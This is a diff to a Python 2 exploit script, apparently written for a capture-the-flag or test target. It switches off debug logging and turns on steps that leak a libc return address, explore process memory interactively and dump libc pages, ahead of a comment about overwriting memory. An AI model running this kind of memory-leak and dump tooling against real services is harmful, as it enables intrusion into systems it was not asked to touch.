@@ -5,10 +5,10 @@ try:
     import standard_logging # pylint: disable=W0611
 except ImportError:
     pass
-logging.getLogger("puppeteer.connection").setLevel(logging.DEBUG)
-logging.getLogger("puppeteer.manipulator").setLevel(logging.DEBUG)
-logging.getLogger("puppeteer.vuln_decorators").setLevel(logging.DEBUG)
-logging.getLogger("puppeteer.formatter").setLevel(logging.DEBUG)
+#logging.getLogger("puppeteer.connection").setLevel(logging.DEBUG)
+#logging.getLogger("puppeteer.manipulator").setLevel(logging.DEBUG)
+#logging.getLogger("puppeteer.vuln_decorators").setLevel(logging.DEBUG)
+#logging.getLogger("puppeteer.formatter").setLevel(logging.DEBUG)
 
 class Aggravator(p.Manipulator):
     def __init__(self, host, port):
@@ -34,7 +34,7 @@ class Aggravator(p.Manipulator):
             print "Program didn't finish the print"
             return ""
 
-        print "GOT:",repr(result)
+        #print "GOT:",repr(result)
         return result
 
 def main():
@@ -54,11 +54,11 @@ def main():
     print "main() will return to (presumably, this is in libc):",hex(lcsm)
 
     # interactive memory explorer!
-    #a.memory_explorer(lcsm)
+    a.memory_explorer(lcsm)
 
     # now dump it!
-    #libc = a.dump_elf(lcsm) #- 0x1000 # the minus is because on my test machine, the address has a \x00 in it
-    #print "dumped %d pages from libc" % len(libc)
+    libc = a.dump_elf(lcsm) #- 0x1000 # the minus is because on my test machine, the address has a \x00 in it
+    print "dumped %d pages from libc" % len(libc)
     #a.dump_libc("aggregator_libc", start_offset=390)
 
     # We can overwrite memory with ease!
